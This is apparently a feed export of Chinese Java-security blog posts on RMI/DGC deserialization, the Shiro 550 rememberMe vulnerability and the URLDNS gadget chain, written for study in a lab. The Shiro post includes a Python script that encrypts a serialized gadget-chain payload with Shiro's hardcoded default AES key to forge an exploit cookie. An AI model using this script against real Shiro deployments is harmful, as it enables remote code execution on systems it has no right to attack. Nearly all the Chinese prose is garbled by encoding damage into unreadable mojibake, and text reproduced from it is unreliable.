<p>åœ¨è°ƒç”¨ä¸€ä¸ªç±»çš„é™æ€å˜é‡çš„æ—¶å€™ï¼Œå®é™…ä¸Šæ˜¯ä¼šå®Œæˆç±»çš„åˆå§‹åŒ–çš„ï¼Œåˆå§‹åŒ–çš„æ—¶å€™é¦–å…ˆä¼šèµ°åˆ°é™æ€ä»£ç å—ï¼Œä¹Ÿå°±æ˜¯èµ°åˆ°<code>java.security.PrivilegedAction#run</code>æ–¹æ³•é‡Œé¢ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225172741408.png" alt="image-20241225172741408"></p>
<p>è°ƒç”¨äº†<code>sun.rmi.server.Util#createStub</code>ï¼Œå®ƒå’Œåˆ›å»ºæ³¨å†Œä¸­å¿ƒåˆ›å»ºä»£ç†çš„é€»è¾‘æ˜¯ä¸€æ‘¸ä¸€æ ·çš„ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯æ‰¾æœ‰æ²¡æœ‰<code>_Stub</code>ç»“å°¾çš„ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>     <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>         <span class="hljs-keyword">try</span> &#123;<br>             Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                           <span class="hljs-literal">false</span>,<br>                           remoteClass.getClassLoader());<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>         &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>             withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥æœ€åä¼šå®ä¾‹åŒ–ä¸€ä¸ª<strong>DGClmpl_Stub</strong>ï¼Œå®ƒçš„å’Œæ³¨å†Œä¸­å¿ƒä¸€æ ·ï¼Œæœ‰ä¸€ä¸ªipå’Œç«¯å£ï¼Œç«¯å£ä¸å›ºå®šï¼Œä½œç”¨æ˜¯è¿œç¨‹å›æ”¶æœåŠ¡ï¼Œæ³¨å†Œä¸­å¿ƒæ˜¯ç”¨æ¥æ³¨å†ŒæœåŠ¡ã€‚è¿™å°±åˆ›å»ºå®Œæˆäº†ã€‚</p>
<p>å¯¹äºå®¢æˆ·ç«¯çš„è¯æœ‰ä¸¤ä¸ªæ–¹æ³•<code>ditry()</code>å’Œ<code>dispatch()</code>ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°DGCå®¢æˆ·ç«¯ä¹Ÿæ˜¯æœ‰ååºåˆ—åŒ–çš„ç‚¹ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225173652868.png" alt="image-20241225173652868"></p>
<p>å¯¹äºæœåŠ¡ç«¯æœ€åçš„è°ƒç”¨æµç¨‹å’Œå®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-æ³¨å†Œä¸­å¿ƒä¸€æ ·çš„ï¼Œèµ°åˆ°<code>DGCImpl_Skel#dispatch</code>æ–¹æ³•ï¼Œä¸€æ ·æœ‰ååºåˆ—åŒ–çš„ç‚¹ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225173803166.png" alt="image-20241225173803166"></p>
<h1 id="è°ƒç”¨æµç¨‹æ€»ç»“"><a href="#è°ƒç”¨æµç¨‹æ€»ç»“" class="headerlink" title="è°ƒç”¨æµç¨‹æ€»ç»“"></a>è°ƒç”¨æµç¨‹æ€»ç»“</h1><p>æŠŠä»¥ä¸Šçš„æµç¨‹ï¼Œå¼•ç”¨su18å¸ˆå‚…çš„å›¾ç‰‡æ¥è¡¨è¿°ä¸€ä¸‹(su18å¸ˆå‚…çš„å›¾ç”»çš„å¤ªå¥½äº†)</p>
<p><img src="https://image.sp4rks.xyz/2024/12/1633322482542.png" alt="1633322482542"></p>
<h1 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h1><p><a href="https://y4er.com/posts/java-rmi/">Java RMIåŸç†åŠååºåˆ—åŒ–å­¦ä¹ </a></p>
<p><a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/#0x01-%E5%89%8D%E8%A8%80">Javaååºåˆ—åŒ–ä¹‹RMIä¸“é¢˜01-RMIåŸºç¡€</a></p>
<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.1387.upload.video_card.click&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–RMIä¸“é¢˜-æ²¡æœ‰äººæ¯”æˆ‘æ›´æ‡‚RMI</a></p>
<p><a href="https://xz.aliyun.com/t/7079?time__1311=n4+xnD0Dy7itGQNKGNnmADu7DcGD9lxflxGupD">åŸºäºJavaååºåˆ—åŒ–RCE - ææ‡‚RMIã€JRMPã€JNDI</a></p>
<p><a href="https://xz.aliyun.com/t/7264?time__1311=n4+xnD0Dy7G=BxGqGNnmADu7DcG8NYOYWe4D">ææ‡‚RMIã€JRMPã€JNDI-ç»ˆç»“ç¯‡</a></p>
<p><a href="https://su18.org/post/rmi-attack/">Java RMI æ”»å‡»ç”±æµ…å…¥æ·±</a></p>
<p><a href="https://xz.aliyun.com/t/16723?time__1311=Gui=iKY50KGIP05DKYYK0=GO3wMrIcnWPaoD">JAVAå®‰å…¨ä¹‹RMIå‘½ä»¤æ‰§è¡Œæ·±åº¦åˆ¨æ</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–Shiro 550åˆ†æ</title>
    <url>/2024/06/09/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Shiro550/</url>
    <content><![CDATA[<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šShiro &lt;&#x3D; 1.2.4</p>
<p><strong>æ¼æ´æ ¹æœ¬åŸå› </strong>:å›ºå®škeyåŠ å¯†</p>
<p><strong>Shiroç‰¹å¾</strong>ï¼šè¿”å›åŒ…ä¸­åŒ…å«rememberMe&#x3D;deleteMeå­—æ®µã€‚</p>
<p>Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚</p>
<p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiroä»‹ç»</a></p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li><p>JDK8u202</p>
</li>
<li><p>tomcat 8.5.100</p>
</li>
<li><p>Shiro 1.2.4</p>
</li>
</ul>
<h3 id="ä¸‹è½½tomcat"><a href="#ä¸‹è½½tomcat" class="headerlink" title="ä¸‹è½½tomcat"></a>ä¸‹è½½tomcat</h3><p><a href="https://tomcat.apache.org/download-80.cgi">tomcat8</a>(ä¸‹è½½å¥½åè§£å‹)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609144237140.png" alt="image-20240609144237140"></p>
<p>å¯åŠ¨tomcatåå‘ç°æ—¥å¿—æ˜¯ä¹±ç </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240531212732532.png" alt="image-20240531212732532"></p>
<p>æ‰¾åˆ°è¿™ä¸ªä½ç½®æŠŠUTF-8æ”¹ä¸ºGBK</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240531213058211.png" alt="image-20240531213058211"></p>
<p><code>Windows</code><strong>ä¸‹çš„<code>CMD</code>çš„é»˜è®¤å­—ç¬¦é›†æ˜¯<code>GBK</code>ï¼Œæ‰€ä»¥<code>UTF8</code>ç¼–ç è¾“å‡ºçš„æ—¥å¿—ï¼Œä¸­æ–‡çœ‹åˆ°çš„è‚¯å®šæ˜¯ä¹±ç äº†ã€‚</strong></p>
<hr>
<h3 id="ä¸‹è½½shiroç¯å¢ƒ"><a href="#ä¸‹è½½shiroç¯å¢ƒ" class="headerlink" title="ä¸‹è½½shiroç¯å¢ƒ"></a>ä¸‹è½½shiroç¯å¢ƒ</h3><p>pç‰›çš„ç¯å¢ƒ:<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">shirodemo</a></p>
<p>ç¼–è¾‘é¡¹ç›®è®¾ç½®</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150059572.png" alt="image-20240609150059572"></p>
<p>æ·»åŠ tomcat</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150152218.png" alt="image-20240609150152218"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150612269.png" alt="image-20240609150612269"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611180441211.png" alt="image-20240611180441211"></p>
<p>é»˜è®¤è´¦å·:root   </p>
<p>é»˜è®¤å¯†ç :secret</p>
<h2 id="Shiro-Cookieå¤„ç†æµç¨‹åˆ†æ"><a href="#Shiro-Cookieå¤„ç†æµç¨‹åˆ†æ" class="headerlink" title="Shiro Cookieå¤„ç†æµç¨‹åˆ†æ"></a>Shiro Cookieå¤„ç†æµç¨‹åˆ†æ</h2><h3 id="åŠ å¯†æµç¨‹åˆ†æ"><a href="#åŠ å¯†æµç¨‹åˆ†æ" class="headerlink" title="åŠ å¯†æµç¨‹åˆ†æ"></a>åŠ å¯†æµç¨‹åˆ†æ</h3><p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸€)-shiro550æµç¨‹åˆ†æ</a></p>
<hr>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªç±»çš„ç»§æ‰¿å…³ç³»</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------------------------+</span><br><span class="hljs-section">| RememberMeManager  &lt;&lt;interface&gt;&gt;  |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|  AbstractRememberMeManager        |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|     CookieRememberMeManager       |</span><br><span class="hljs-section">+-----------------------------------+</span><br></code></pre></td></tr></table></figure>

<hr>
<p><strong>RememberMeManager</strong></p>
<p><code>RememberMeManager</code>æ¥å£æä¾›äº†ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<ul>
<li><code>getRememberedPrincipals()</code>ï¼šRememberMe çš„åŠŸèƒ½ã€‚</li>
<li><code>forgetIdentity()</code>ï¼šå¿˜è®°ç”¨æˆ·èº«ä»½æ ‡è¯†ã€‚</li>
<li><code>onSuccessfulLogin()</code>ï¼šç™»å½•æ ¡éªŒæˆåŠŸæ—¶è°ƒç”¨ï¼Œä¿å­˜å½“å‰ç”¨æˆ·çš„<code>principals</code>ä»¥ä¾›åº”ç”¨ç¨‹åºä»¥åè°ƒç”¨ã€‚</li>
<li><code>onFailedLogin()</code>ï¼šç™»å½•æ ¡éªŒå¤±è´¥æ—¶è°ƒç”¨ï¼Œå¿˜è®°å½“å‰ç”¨æˆ·çš„<code>principals</code>ã€‚</li>
<li><code>onLogout()</code>ï¼šç”¨æˆ·é€€å‡ºç™»å½•æ—¶è°ƒç”¨ï¼Œå¿˜è®°å½“å‰ç”¨æˆ·çš„<code>principals</code>ã€‚</li>
</ul>
<p><strong>AbstractRememberMeManager</strong></p>
<p><code>AbstractRememberMeManager</code>æ˜¯å®ç°<code>RememberMeManger</code>æ¥å£ç±»çš„æŠ½è±¡ç±»ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„æˆå‘˜å˜é‡éœ€è¦äº†è§£ï¼š</p>
<ul>
<li><code> DEFAULT_CIPHER_KEY_BYTES</code>ï¼šä¸€ä¸ªç¡¬ç¼–ç  AES KEYï¼Œè¯¥ KEY ä¼šè¢«è®¾ç½®ä¸ºåŠ è§£å¯† KEY çš„æˆå‘˜å˜é‡ã€‚</li>
<li><code>serializer</code>ï¼šShiro çš„åºåˆ—åŒ–å™¨ï¼Œç”¨æ¥å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ ‡è¯†ç”¨æˆ·èº«ä»½çš„<code>PrincipalCollection</code>å¯¹è±¡ã€‚</li>
<li><code>cipherService</code>ï¼šç”¨äºæ•°æ®åŠ è§£å¯†çš„ç±»ï¼Œå®é™…ä¸Šæ˜¯<code>org.apache.shiro.crypto.AesCipherService</code>ç±»ã€‚</li>
</ul>
<p><strong>CookieRememberMeManager</strong></p>
<p><code>getRememberedSerializedIdentity()</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br>	<br>    	<span class="hljs-comment">//å¦‚æœä¸æ˜¯ HTTP ç›¸å…³è”çš„å®ä¾‹ï¼Œè®°å½•è°ƒè¯•ä¿¡æ¯å¹¶è¿”å› null</span><br>       <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;<br>           <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                       <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                       <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>               log.debug(msg);<br>           &#125;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>	<br>    	<span class="hljs-comment">//è°ƒç”¨ isIdentityRemoved(wsc) æ–¹æ³•æ£€æŸ¥èº«ä»½æ˜¯å¦å·²ç§»é™¤ã€‚å¦‚æœå·²ç§»é™¤ï¼Œè¿”å› nullã€‚</span><br>       <span class="hljs-type">WebSubjectContext</span> <span class="hljs-variable">wsc</span> <span class="hljs-operator">=</span> (WebSubjectContext) subjectContext;<br>       <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>	<br>    	<span class="hljs-comment">//è·å– HTTP è¯·æ±‚å’Œå“åº”å¯¹è±¡:</span><br>       <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WebUtils.getHttpRequest(wsc);<br>       <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> WebUtils.getHttpResponse(wsc);<br>	<br>    	<span class="hljs-comment">/*</span><br><span class="hljs-comment">    		è¯»å–å¹¶å¤„ç†cookie:è°ƒç”¨ getCookie().readValue(request, response) è¯»å–â€œè®°ä½æˆ‘â€cookie çš„å€¼ã€‚</span><br><span class="hljs-comment">		æ£€æŸ¥ cookie æ˜¯å¦å·²è¢«åˆ é™¤ï¼ˆCookie.DELETED_COOKIE_VALUEï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› nullã€‚</span><br><span class="hljs-comment">		å¦‚æœ cookie å­˜åœ¨ï¼Œå¯¹å…¶è¿›è¡Œ Base64 è§£ç ã€‚</span><br><span class="hljs-comment">		è®°å½•è§£ç åçš„ä¿¡æ¯ï¼ˆå¦‚æœå¯ç”¨äº†è¯¦ç»†æ—¥å¿—ï¼‰ã€‚</span><br><span class="hljs-comment">		è¿”å›è§£ç åçš„å­—èŠ‚æ•°ç»„ã€‚</span><br><span class="hljs-comment">	*/</span>	<br>       <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> getCookie().readValue(request, response);<br>       <span class="hljs-comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span><br>       <span class="hljs-comment">// ignore cookies that are scheduled for removal</span><br>       <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>           base64 = ensurePadding(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>           &#125;<br>           <span class="hljs-type">byte</span>[] decoded = Base64.decode(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">return</span> decoded;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-comment">//no cookie set - new site visitor?</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>



<h2 id="Shiro-550æ¼æ´åˆ©ç”¨"><a href="#Shiro-550æ¼æ´åˆ©ç”¨" class="headerlink" title="Shiro 550æ¼æ´åˆ©ç”¨"></a>Shiro 550æ¼æ´åˆ©ç”¨</h2><h3 id="CC11é“¾æ”»å‡»"><a href="#CC11é“¾æ”»å‡»" class="headerlink" title="CC11é“¾æ”»å‡»"></a>CC11é“¾æ”»å‡»</h3><p>æ³¨ï¼šåŸç”Ÿ shiro ä¸­æ˜¯æ²¡æœ‰ common-collectionsçš„ï¼Œè¿™é‡Œä¸ºäº†æ¼”ç¤ºï¼Œæ‰€ä»¥æ·»åŠ äº† common-collections ä¾èµ–</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611200459717.png" alt="image-20240611200459717"></p>
<p>åŠ å¯†è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> mode<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br> <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br> BS = AES.block_size<br> pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br> enc_data = base64.b64decode(enc_data)<br> unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = enc_data[:<span class="hljs-number">16</span>]<br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br> plaintext = unpad(plaintext)<br> <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br> <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªè„šæœ¬çš„æ„æ€å°±æ˜¯å…ˆaesåŠ å¯†ï¼Œå†base64ç¼–ç ï¼Œç¬¦åˆshiroé€»è¾‘</p>
<p>å¯¹CC11çš„åºåˆ—åŒ–æ•°æ®ç¼–ç </p>
<p>å½“Cookieä¸­æœ‰JSESSIONIDæ—¶ï¼Œä¸ä¼šé€šè¿‡rememberMeçš„æ•°æ®è¿›è¡Œèº«ä»½è®¤è¯ï¼Œå°±æ‰§è¡Œä¸äº†æˆ‘ä»¬æ„é€ å¥½çš„EXP</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211916791.png" alt="image-20240611211916791"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211931741.png" alt="image-20240611211931741"></p>
<h3 id="CBé“¾æ”»å‡»"><a href="#CBé“¾æ”»å‡»" class="headerlink" title="CBé“¾æ”»å‡»"></a>CBé“¾æ”»å‡»</h3><p>å› ä¸ºåŸç”Ÿçš„Shiroå¹¶ä¸å¸¦CCä¾èµ–ï¼Œä½†æ˜¯åŒ…å«äº†commons-beanutilsï¼Œæ‰€ä»¥å‚è€ƒ<a href="https://sp4rks3.github.io/2024/06/08/JAVA%E5%AE%89%E5%85%A8/CB%E9%93%BE/">Javaååºåˆ—åŒ–CommonsBeanutilsé“¾</a></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213742442.png" alt="image-20240611213742442"></p>
<p>ç”¨ä¹‹å‰çš„CBé“¾æ‰“ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸º<code>org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</code></p>
<p>è¿™æ˜¯å› ä¸ºCBç‰ˆæœ¬ä¸ä¸€è‡´å¯¼è‡´çš„</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213705631.png" alt="image-20240611213705631"></p>
<p>Shiroç¯å¢ƒä¸­commons-beanutilsç‰ˆæœ¬ä¸º1.8.3</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213801082.png" alt="image-20240611213801082"></p>
<p>æœ€ç®€å•çš„æ¥è§£å†³åŠæ³•å°±æ˜¯æŠŠä¹‹å‰æœ¬åœ°ç¯å¢ƒä¸­commons-beanutilsçš„ç‰ˆæœ¬å˜ä¸ºShiroçš„commons-beanutilsç‰ˆæœ¬</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213925075.png" alt="image-20240611213925075"></p>
<h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiroå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰ï¼šShiroæ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆç”¨</a></p>
<p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸€)-shiro550æµç¨‹åˆ†æ</a></p>
<p><a href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(äºŒ)-shiroä¸‹çš„CCé“¾åˆ©ç”¨</a></p>
<p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸‰)-shiroæ— ä¾èµ–åˆ©ç”¨é“¾</a></p>
<p><a href="https://github.com/dota-st/JavaSec/blob/master/04-Shiro%E4%B8%93%E5%8C%BA/1-Shiro%E4%B9%8BCVE-2016-4437/index.md">CVE-2016-4437æ¼æ´åˆ†æ</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>RULDNSé“¾</title>
    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h2 id="URLDNSé“¾ä¼˜ç‚¹"><a href="#URLDNSé“¾ä¼˜ç‚¹" class="headerlink" title="URLDNSé“¾ä¼˜ç‚¹"></a>URLDNSé“¾ä¼˜ç‚¹</h2><ol>
<li>ä½¿â½¤Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰â½…åº“æ²¡æœ‰ä¾èµ–</li>
<li>åœ¨â½¬æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</li>
</ol>
<h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p>ysoserial ä¸­URLDNSé“¾ ï¼Œ çœ‹è¿™ä¸ªåˆ©ç”¨é“¾åªæ¶‰åŠä¸¤ä¸ªç±»<strong>HashMap</strong>å’Œ<strong>URL</strong>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509090622554.png" alt="image-20240509090622554"></p>
<h3 id="HashMapç±»"><a href="#HashMapç±»" class="headerlink" title="HashMapç±»"></a>HashMapç±»</h3><p><strong>HashMap</strong>è‡ªå·±å®ç°äº†<code>readObject()</code>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093642516.png" alt="image-20240509093642516"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure>

<p>putValé‡æ–°è®¡ç®—äº†keyçš„hashï¼Œè·Ÿè¿›<code>hash()</code>ï¼ˆCtrl+é¼ æ ‡å·¦é”®ï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093734192.png" alt="image-20240509093734192"></p>
<p>ä»£ç æ„æ€æ˜¯å¦‚æœkeyä¸ºnullè¿”å›0ï¼Œå¦‚æœä¸ä¸ºnullï¼Œåˆ™è°ƒç”¨keyçš„<code>hashCode()</code>ã€‚</p>
